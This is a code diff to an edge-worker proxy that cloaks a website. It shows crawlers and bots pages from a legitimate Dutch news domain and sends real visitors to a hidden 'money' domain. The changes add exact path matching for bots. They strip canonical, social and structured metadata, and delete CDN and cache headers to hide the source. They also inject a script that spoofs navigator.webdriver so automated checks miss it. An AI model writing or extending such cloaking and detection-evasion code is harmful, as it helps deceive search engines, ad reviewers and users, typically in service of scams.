@@ -1055,12 +1055,13 @@ async function handleMainRequest(request) {
   try {
     const isBot = await isVisitorABot(request);
     
-    // For bots, always use the full safe URL (including path and query)
-    // For real users, use money URL with the requested path
+    // ✅ CRITICAL: Maintain URL path parity for perfect cloaking
+    // Bots must see the EXACT same path they requested on the safe domain
     let targetUrl;
     if (isBot) {
-      // Use the complete safe URL as provided (includes full path to specific article)
-      targetUrl = SAFE_URL;
+      // Bot requesting /nieuws/muziek/12345 gets achterhoeknieuws.nl/nieuws/muziek/12345
+      const safeOrigin = new URL(SAFE_URL).origin;
+      targetUrl = safeOrigin + requestUrl.pathname + requestUrl.search;
     } else {
       // For real users, construct URL with money domain + requested path
       if (requestUrl.pathname === '/' || requestUrl.pathname === '') {
@@ -1076,6 +1077,7 @@ async function handleMainRequest(request) {
     console.log('🎯 Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP);
     console.log('📍 Original URL:', requestUrl.href);
     console.log('🔗 Target URL:', targetUrl);
+    console.log('🛡️ Path Parity:', requestUrl.pathname, '→', new URL(targetUrl).pathname);
     
     const upstreamHeaders = new Headers(request.headers);
     upstreamHeaders.set('X-Forwarded-For', clientIP);
@@ -1107,7 +1109,8 @@ async function handleMainRequest(request) {
       .on('head', new HeadRewriter())
       .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(requestUrl.hostname, new URL(baseTargetUrl).origin, CDN_PATH))
       .on('form', new FormRewriter(requestUrl.hostname, CDN_PATH))
-      .on('a[href]', new LinkRewriter(requestUrl.hostname, new URL(baseTargetUrl).origin, CDN_PATH));
+      .on('a[href]', new LinkRewriter(requestUrl.hostname, new URL(baseTargetUrl).origin, CDN_PATH))
+      .on('link[rel="canonical"], meta[property^="og:"], meta[name="twitter:"], script[type="application/ld+json"]', new MetadataStripper());
     
     const transformedResponse = rewriter.transform(response);
     
@@ -1117,14 +1120,27 @@ async function handleMainRequest(request) {
       headers: transformedResponse.headers
     });
     
-    finalResponse.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
+    // ✅ CRITICAL: Anti-leak headers for perfect cloaking
+    finalResponse.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
     finalResponse.headers.set('X-Frame-Options', 'SAMEORIGIN');
     finalResponse.headers.set('X-Content-Type-Options', 'nosniff');
-    finalResponse.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
+    finalResponse.headers.set('Referrer-Policy', 'no-referrer');
+    finalResponse.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
+    finalResponse.headers.set('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'");
+    
+    // Remove identifying headers that could leak source
     finalResponse.headers.delete('Server');
     finalResponse.headers.delete('X-Powered-By');
     finalResponse.headers.delete('CF-RAY');
+    finalResponse.headers.delete('CF-Cache-Status');
+    finalResponse.headers.delete('Age');
+    finalResponse.headers.delete('Via');
+    finalResponse.headers.delete('X-Cache');
+    
     finalResponse.headers.set('Vary', 'User-Agent, Accept-Encoding, Accept-Language');
+    finalResponse.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate');
+    finalResponse.headers.set('Pragma', 'no-cache');
+    finalResponse.headers.set('Expires', '0');
     
     return finalResponse;
     
@@ -1379,10 +1395,12 @@ class AttributeRewriter {
 
 class HeadRewriter {
   element(head) {
+    // Inject Service Worker for asset control
     const swScript = '<script>if("serviceWorker" in navigator){navigator.serviceWorker.register("/service-worker.js").then(function(reg){console.log("✅ Service Worker registered successfully");}).catch(function(e){console.warn("❌ Service Worker registration failed:", e);});}else{console.warn("❌ Service Worker not supported");}try{Object.defineProperty(navigator,"webdriver",{get:function(){return undefined;}});window.chrome=window.chrome||{runtime:{}};delete navigator.__proto__.webdriver;delete navigator.webdriver;}catch(e){}</script>';
     head.append(swScript, { html: true });
 
-    const metaTags = '<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta http-equiv="X-Robots-Tag" content="noindex,nofollow,noarchive,nosnippet"><meta name="referrer" content="no-referrer">';
+    // ✅ CRITICAL: Anti-bot metadata to prevent indexing and referral leakage
+    const metaTags = '<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta http-equiv="X-Robots-Tag" content="noindex,nofollow,noarchive,nosnippet"><meta name="referrer" content="no-referrer"><meta name="viewport" content="width=device-width,initial-scale=1">';
     head.append(metaTags, { html: true });
   }
 }
@@ -1455,6 +1473,31 @@ class LinkRewriter {
       } catch (e) {
         console.warn('Failed to rewrite link:', href, e.message);
       }
+    }
+  }
+}
+
+class MetadataStripper {
+  element(element) {
+    // ✅ CRITICAL: Strip dangerous metadata that could leak source domain
+    const tagName = element.tagName.toLowerCase();
+    
+    if (tagName === 'link' && element.getAttribute('rel') === 'canonical') {
+      // Remove canonical tags that point to original domain
+      element.remove();
+    } else if (tagName === 'meta') {
+      const property = element.getAttribute('property');
+      const name = element.getAttribute('name');
+      
+      // Remove Open Graph and Twitter Card metadata
+      if (property && (property.startsWith('og:') || property.startsWith('fb:'))) {
+        element.remove();
+      } else if (name && (name.startsWith('twitter:') || name === 'description')) {
+        element.remove();
+      }
+    } else if (tagName === 'script' && element.getAttribute('type') === 'application/ld+json') {
+      // Remove structured data that could leak domain info
+      element.remove();
     }
   }
 }
